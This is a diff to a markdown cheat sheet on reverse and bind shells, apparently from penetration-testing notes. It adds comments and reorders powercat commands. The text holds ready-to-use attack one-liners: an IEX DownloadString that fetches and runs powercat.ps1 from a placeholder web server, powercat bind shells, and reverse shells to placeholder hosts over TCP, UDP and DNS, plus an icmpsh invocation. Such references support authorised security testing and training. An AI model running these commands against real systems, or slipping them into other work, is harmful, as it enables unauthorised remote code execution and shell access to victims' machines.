@@ -212,6 +212,7 @@ python icmpsh_m.py <HOST_IP> <TARGET_IP>
 
 ```
 powercat -l -p 443 -ep
+powercat -l -p 443 -e <BINARY>
 ```
 
 #### One-liners reverse shell
@@ -267,14 +268,16 @@ As with any PowerShell function, powercat has to be loaded in memory to be execu
 . .\powercat.ps1
 IEX (New-Object System.Net.Webclient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/powercat.ps1')
 
-powercat -c <IP> -p <PORT> -e <BINARY>
+# -ep: execute PowerShell
+# -e: or execute the specified binary
 powercat -c <IP> -p <PORT> -ep
+powercat -c <IP> -p <PORT> -e <BINARY>
 
 # Over UDP
 powercat -u -c <IP> -p <PORT> -ep
 
 # Over DNS
- powercat -c <DNS_SERVER_IP> -p <DNS_SERVER_PORT> -dns <DNS_HOSTNAME> -ep
+powercat -c <DNS_SERVER_IP> -p <DNS_SERVER_PORT> -dns <DNS_HOSTNAME> -ep
 ```
 
 ###### Python
